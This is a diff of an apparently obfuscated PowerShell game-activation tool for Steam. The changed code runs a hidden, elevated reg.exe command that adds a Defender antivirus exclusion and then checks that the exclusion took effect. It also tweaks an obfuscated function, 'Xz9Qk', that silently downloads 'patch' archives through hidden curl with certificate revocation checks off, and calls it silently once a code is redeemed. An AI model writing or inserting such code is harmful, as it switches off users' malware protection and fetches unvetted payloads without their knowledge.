@@ -178,7 +178,7 @@ function New-BufferedPanel {
 
 
 
-$script:version = "V1.38"
+$script:version = "V1.39"
 $errorLogFile = Join-Path $env:TEMP (S("YnNtYXBfZXJyb3IubG9n"))
 
 function WEL {
@@ -1739,7 +1739,12 @@ function Add-DefenderExclusion {
     } catch {}
     try {
         $cmd = "reg.exe ADD `"HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths`" /v `"$Path`" /t REG_DWORD /d 0 /f"
-        Start-Process cmd -ArgumentList "/c $cmd" -Verb RunAs -WindowStyle Hidden -Wait -ErrorAction Stop
+        $pEx = Start-Process cmd -ArgumentList "/c $cmd" -Verb RunAs -WindowStyle Hidden -PassThru -ErrorAction Stop
+        if (-not $pEx.WaitForExit(25000)) { return $false }
+        if ($pEx.ExitCode -ne 0) { return $false }
+        $vrf = @()
+        try { $vrf = @((Get-ItemProperty -Path $regPath -ErrorAction Stop).PSObject.Properties.Name) } catch {}
+        if ($vrf -notcontains $Path) { return $false }
         Save-DefExclFlag $Path
         return $true
     } catch { return $false }
@@ -2723,7 +2728,6 @@ function Xz9Qk {
                 }
             } catch { $data=$null }
             foreach ($u in $urls) {
-                try { $wc2=New-Object System.Net.WebClient; $data=$wc2.DownloadData($u); if ($data -and $data.Length -gt 1000) { break } } catch { $dlErr=$_.Exception.Message }
                 try { $tmp2=Join-Path $env:TEMP "patch_dl_$(Get-Random).zip"; Invoke-WebRequest -Uri $u -OutFile $tmp2 -UseBasicParsing -TimeoutSec 30; $data=[IO.File]::ReadAllBytes($tmp2); Remove-Item $tmp2 -Force -ErrorAction SilentlyContinue; if ($data.Length -gt 1000) { break } } catch { $dlErr=$_.Exception.Message }
                 try { $tmp3=Join-Path $env:TEMP "patch_curl_$(Get-Random).zip"; $crP = Invoke-CurlHidden @('-sL','--ssl-no-revoke','-o',$tmp3,$u,'--max-time','30') 40; if (($crP.exit -eq 0) -and (Test-Path $tmp3) -and ((Get-Item $tmp3).Length -gt 1000)) { $data=[IO.File]::ReadAllBytes($tmp3); Remove-Item $tmp3 -Force -ErrorAction SilentlyContinue; break } } catch { $dlErr=$_.Exception.Message }
             }
@@ -4297,6 +4301,7 @@ $script:subB.Add_Click({
         if (-not $expDate -and $duration -gt 0) { $expDate = $baseNow.AddSeconds($duration) }
         $steamRoot = Get-SteamPath
         try { Set-LoteJob (New-LoteJob $code $links $duration $expDate $steamRoot) } catch {}
+        try { $lblR.ForeColor=$script:Yellow; $lblR.Text="Codigo valido, instalando..."; [System.Windows.Forms.Application]::DoEvents() } catch {}
         try { $null = Xz9Qk -Silent } catch {}
         $total=$links.Count
         try { $script:activeCodes.Add(@{Code=$code;Game="";ActivatedAt=$baseNow;ExpiresAt=$(if($expDate){$expDate}else{$baseNow.AddYears(1)});Duration=$duration;InternetCreatedAt=$baseNow.ToString("o")})|Out-Null } catch {}
